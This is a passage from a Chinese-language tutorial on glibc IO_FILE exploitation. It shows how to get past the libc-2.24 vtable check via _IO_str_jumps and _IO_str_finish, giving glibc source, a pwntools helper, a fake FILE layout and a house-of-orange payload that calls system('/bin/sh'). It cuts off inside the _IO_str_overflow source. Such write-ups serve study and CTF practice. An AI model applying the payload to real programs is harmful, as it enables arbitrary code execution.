</span></span><span class="line"><span class="cl">      <span class="n">_mode</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="c1">//一般不用特意设置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">&#39;\000&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="n">vtable</span> <span class="o">=</span> <span class="n">heap_addr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_addr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">__dummy</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">__dummy2</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">__finish</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">__overflow</span> <span class="o">=</span> <span class="n">system_addr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因此这样构造，通过<code>_IO_OVERFLOW (fp)</code>，我们就实现了<code>system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p>而<code>libc-2.24</code>加入了对虚表的检查<code>IO_validate_vtable()</code>与<code>IO_vtable_check()</code>，若无法通过检查，则会报错：<code>Fatal error: glibc detected an invalid stdio handle</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
</span></span></span><span class="line"><span class="cl"><span class="cp"># define _IO_JUMPS_FUNC(THIS) 
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="p">(</span><span class="nf">IO_validate_vtable</span>                                                   
</span></span><span class="line"><span class="cl">   <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">**</span><span class="p">)</span> <span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="nf">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">THIS</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">                 <span class="o">+</span> <span class="p">(</span><span class="n">THIS</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_vtable_offset</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见在最终调用<code>vtable</code>的函数之前，内联进了<code>IO_validate_vtable</code>函数，其源码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span> <span class="nf">IO_validate_vtable</span> <span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uintptr_t</span> <span class="n">section_length</span> <span class="o">=</span> <span class="n">__stop___libc_IO_vtables</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uintptr_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">section_length</span><span class="p">))</span> <span class="c1">//检查vtable指针是否在glibc的vtable段中。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">_IO_vtable_check</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>glibc</code>中有一段完整的内存存放着各个<code>vtable</code>，其中<code>__start___libc_IO_vtables</code>指向第一个<code>vtable</code>地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个<code>vtable_IO_str_chk_jumps</code>结束的地址。
若指针不在<code>glibc</code>的<code>vtable</code>段，会调用<code>_IO_vtable_check()</code>做进一步检查，以判断程序是否使用了外部合法的<code>vtable</code>（重构或是动态链接库中的<code>vtable</code>），如果不是则报错。
具体源码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">attribute_hidden</span> <span class="nf">_IO_vtable_check</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef SHARED
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flag</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="nf">atomic_load_relaxed</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">IO_accept_foreign_vtables</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">_IO_vtable_check</span><span class="p">)</span> <span class="c1">//检查是否是外部重构的vtable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Dl_info</span> <span class="n">di</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">_dl_open_hook</span> <span class="o">!=</span> <span class="nb">NULL</span>
</span></span><span class="line"><span class="cl">        <span class="o">||</span> <span class="p">(</span><span class="nf">_dl_addr</span> <span class="p">(</span><span class="n">_IO_vtable_check</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">di</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_ns</span> <span class="o">!=</span> <span class="n">LM_ID_BASE</span><span class="p">))</span> <span class="c1">//检查是否是动态链接库中的vtable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="nf">__libc_fatal</span> <span class="p">(</span><span class="s">&#34;Fatal error: glibc detected an invalid stdio handle</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因此，最好的办法是：我们伪造的<code>vtable</code>在<code>glibc</code>的<code>vtable</code>段中，从而得以绕过该检查。
目前来说，有四种思路：利用<code>_IO_str_jumps</code>中<code>_IO_str_overflow()</code>函数，利用<code>_IO_str_jumps</code>中<code>_IO_str_finish()</code>函数与利用<code>_IO_wstr_jumps</code>中对应的这两种函数，先来介绍最为方便的：利用<code>_IO_str_jumps</code>中<code>_IO_str_finish()</code>函数的手段。
<code>_IO_str_jumps</code>的结构体如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_str_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_str_finish</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_str_overflow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_str_underflow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中，<code>_IO_str_finish</code>源代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">_IO_str_finish</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dummy</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">(((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span> <span class="c1">//执行函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_IO_default_finish</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中相关的<code>_IO_str_fields</code>结构体与<code>_IO_strfile_</code>结构体的定义：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_str_fields</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_alloc_type</span> <span class="n">_allocate_buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_free_type</span> <span class="n">_free_buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IO_strfile_</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_streambuf</span> <span class="n">_sbf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_str_fields</span> <span class="n">_s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">_IO_strfile</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到，它使用了<code>IO</code>结构体中的值当作函数地址来直接调用，如果满足条件，将直接将<code>fp-&gt;_s._free_buffer</code>当作<strong>函数指针</strong>来调用。
首先，仍然需要绕过之前的<code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查<code>_mode&lt;=0</code>以及<code>_IO_write_ptr&gt;_IO_write_base</code>进入到<code>_IO_OVERFLOW</code>中。
我们可以将<code>vtable</code>的地址覆盖成<code>_IO_str_jumps-8</code>，这样会使得<code>_IO_str_finish</code>函数成为了伪造的<code>vtable</code>地址的<code>_IO_OVERFLOW</code>函数（因为<code>_IO_str_finish</code>偏移为<code>_IO_str_jumps</code>中<code>0x10</code>，而<code>_IO_OVERFLOW</code>为<code>0x18</code>）。这个<code>vtable</code>（地址为<code>_IO_str_jumps-8</code>）可以绕过检查，因为它在<code>vtable</code>的地址段中。
构造好<code>vtable</code>之后，需要做的就是构造<code>IO FILE</code>结构体其他字段，以进入将<code>fp-&gt;_s._free_buffer</code>当作函数指针的调用：先构造<code>fp-&gt;_IO_buf_base</code>为<code>/bin/sh</code>的地址，然后构造<code>fp-&gt;_flags</code>不包含<code>_IO_USER_BUF</code>，它的定义为<code>#define _IO_USER_BUF 1</code>，即<code>fp-&gt;_flags</code>最低位为<code>0</code>。
最后构造<code>fp-&gt;_s._free_buffer</code>为<code>system_addr</code>或<code>one gadget</code>即可<code>getshell</code>。
由于<code>libc</code>中没有<code>_IO_str_jump</code>的符号，因此可以通过<code>_IO_str_jumps</code>是<code>vtable</code>中的倒数第二个表，用<code>vtable</code>的最后地址减去<code>0x168</code>定位。
也可以用如下函数进行定位：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp"># libc.address = libc_base
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">def</span> <span class="nf">get_IO_str_jumps</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">IO_file_jumps_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_file_jumps</span><span class="err">&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">IO_str_underflow_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_str_underflow</span><span class="err">&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ref</span> <span class="n">in</span> <span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">IO_str_underflow_addr</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">possible_IO_str_jumps_addr</span> <span class="o">=</span> <span class="n">ref</span> <span class="o">-</span> <span class="mh">0x20</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">possible_IO_str_jumps_addr</span> <span class="o">&gt;</span> <span class="nl">IO_file_jumps_addr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">possible_IO_str_jumps_addr</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以进行如下构造：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">.</span><span class="n">_chain</span> <span class="o">=&gt;</span> <span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_flags</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">bin_sh_addr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl">      <span class="n">_mode</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="c1">//一般不用特意设置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">&#39;\000&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_str_jumps</span><span class="o">-</span><span class="mi">8</span> <span class="c1">//chunk_addr + 0xd8 ~ +0xe0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="mh">0xe0</span> <span class="o">~</span> <span class="o">+</span><span class="mh">0xe8</span> <span class="o">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="mh">0xe8</span> <span class="o">~</span> <span class="o">+</span><span class="mh">0xf0</span> <span class="o">:</span> <span class="n">system_addr</span> <span class="o">/</span> <span class="n">one_gadget</span> <span class="c1">//fp-&gt;_s._free_buffer
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>利用<code>house of orange</code>构造的<code>payload</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_list_all</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="err">#</span><span class="n">unsorted</span> <span class="n">bin</span> <span class="n">attack</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">b</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="n">b</span><span class="sc">&#39;\x00&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">get_IO_str_jumps</span><span class="p">()</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>再来介绍一下：利用<code>_IO_str_jumps</code>中<code>_IO_str_overflow()</code>函数的手段。
<code>_IO_str_overflow()</code>函数的源码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">_IO_str_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_size_t</span> <span class="n">pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">flush_only</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_TIED_PUT_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
